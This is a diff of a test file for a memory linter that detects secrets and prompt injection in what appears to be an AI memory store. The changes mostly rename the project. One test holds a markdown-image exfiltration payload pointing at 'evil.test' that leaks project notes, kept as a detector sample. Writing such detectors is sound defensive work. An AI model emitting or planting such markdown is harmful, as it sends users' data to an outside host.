@@ -1,5 +1,5 @@
 // Write-time memory linter: secret + prompt-injection detection, the
-// ONEMEMORY_LINT policy (block / quarantine / warn), the quarantine queue
+// MONOMEM_LINT policy (block / quarantine / warn), the quarantine queue
 // (store, MCP memory_quarantine, REST status codes) and -- just as important
 // -- benign look-alikes that must NOT trip it.
 import { test, describe, before, after, afterEach } from "node:test";
@@ -16,10 +16,10 @@ import { createApiServer } from "../src/api.js";
 // Credential-shaped fixtures are assembled from fragments so no secret-like
 // literal appears verbatim in this file (push protection / scanners).
 const j = (...p: string[]): string => p.join("");
-const SAVE = process.env.ONEMEMORY_LINT;
+const SAVE = process.env.MONOMEM_LINT;
 function setPolicy(v: string | undefined): void {
-  if (v === undefined) delete process.env.ONEMEMORY_LINT;
-  else process.env.ONEMEMORY_LINT = v;
+  if (v === undefined) delete process.env.MONOMEM_LINT;
+  else process.env.MONOMEM_LINT = v;
 }
 function parseTool(r: any): any {
   const t: string = r.content[0].text;
@@ -47,7 +47,7 @@ describe("secret detection (extended)", () => {
       "ThisIsAVeryLongIdentifierName2026Version",
       "MyProject_v2_FinalDraft_2026_10_16_Rev3",
       "SUPER-SECRET-BODY-MARKER-9f3a-updated",
-      "https://github.com/calasdan-sketch/onememory/blob/main/src/store.ts",
+      "https://github.com/calasdan-sketch/monomem/blob/main/src/store.ts",
       "integrity sha512-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
       "the sk-learn library and the task-runner config", // "sk-" in prose
       "ask Kara about the eyJ prefix in JWTs",
@@ -188,7 +188,7 @@ describe("linter hardening (r3)", () => {
   });
 });
 
-describe("ONEMEMORY_LINT policy parsing", () => {
+describe("MONOMEM_LINT policy parsing", () => {
   afterEach(() => setPolicy(SAVE));
   test("default is secrets=block, injection=quarantine", () => {
     assert.deepEqual(lintPolicy(""), { secret: "block", injection: "quarantine", entropy: "warn" });
@@ -442,10 +442,10 @@ test("a remote markdown image with a query string is flagged; badges and plain l
     "![logo](https://evil.test/a.gif?q=1&leak=project-notes)",
   ]) assert.equal(scanForInjection(t), "markdown exfiltration", t);
   for (const t of [
-    "![CI](https://img.shields.io/npm/v/onememory-mcp?style=flat)",
+    "![CI](https://img.shields.io/npm/v/monomem?style=flat)",
     "![badge](https://badgen.net/npm/v/x?color=green)",
     "![diagram](https://example.com/arch.png)",
-    "[docs](https://example.com/search?q=onememory)",
+    "[docs](https://example.com/search?q=monomem)",
     "![local](./docs/demo.gif)",
   ]) assert.equal(scanForInjection(t), null, t);
 });
